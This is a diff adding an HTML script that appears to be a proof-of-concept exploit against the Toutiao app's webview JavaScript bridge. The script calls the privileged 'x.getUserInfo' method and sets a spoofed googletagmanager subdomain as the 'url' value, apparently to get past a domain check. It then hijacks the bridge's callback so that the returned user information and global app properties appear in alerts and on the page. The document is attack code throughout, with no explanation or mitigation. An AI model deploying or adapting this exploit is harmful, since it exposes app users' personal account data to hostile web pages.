@@ -1,0 +1,28 @@
+
+<script>
+ToutiaoJSBridge.invokeMethod(JSON.stringify({
+    "__callback_id": "0",
+    "func": "x.getUserInfo",
+    "__msg_type": "callback",
+    "params": {"url":"https://lalala.googletagmanager.com","method":"post"},
+    "JSSDK": "1",
+    "namespace": "host"}));
+
+ToutiaoJSBridge._handleMessageFromToutiao = function name(message) {
+    var messageString = JSON.stringify(message, null, 2);
+    var msg2 = __globalprops.getGlobalProps();
+
+    alert(msg2);
+
+    var messageContainer1 = document.createElement('pre');
+    messageContainer1.textContent = msg2;
+    document.body.appendChild(messageContainer1);
+    console.log("Message received from Toutiao: " + messageString);
+
+    alert("Message received from Toutiao: " + messageString);
+
+    var messageContainer = document.createElement('pre');
+    messageContainer.textContent = messageString;
+    document.body.appendChild(messageContainer);
+}
+</script>
